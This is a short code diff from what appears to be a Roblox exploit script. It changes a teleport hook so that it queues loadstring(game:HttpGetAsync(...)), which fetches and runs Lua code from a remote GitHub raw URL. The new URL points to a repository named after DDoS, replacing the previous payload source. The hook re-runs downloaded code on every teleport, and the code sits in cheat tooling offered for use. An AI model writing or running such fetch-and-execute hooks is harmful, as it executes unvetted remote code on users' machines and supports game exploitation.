@@ -2,7 +2,7 @@ local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or flux
 
 local teleportfunc = game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
-		local teleportstr = 'loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()'
+		local teleportstr = 'loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DDoSggDotNet/tretst/main/Fucker.text"))()'
 		queueteleport(teleportstr)
     end
 end)
